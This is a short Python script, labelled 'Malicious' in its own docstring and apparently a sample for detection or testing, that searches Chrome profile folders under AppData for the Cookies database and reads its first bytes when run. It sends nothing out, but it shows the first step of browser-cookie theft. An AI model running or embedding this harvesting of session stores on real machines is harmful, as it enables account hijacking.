"""Malicious: Searches AppData and Chrome profiles for cookie sqlite db."""
import os
import glob

def find_chrome_cookies():
    user_home = os.path.expanduser("~")
    cookie_pattern = os.path.join(user_home, "AppData", "Local", "Google", "Chrome", "User Data", "*", "Cookies")
    matches = glob.glob(cookie_pattern)
    for cookie_file in matches:
        try:
            with open(cookie_file, "rb") as f:
                data = f.read(512)
        except Exception:
            pass

find_chrome_cookies()
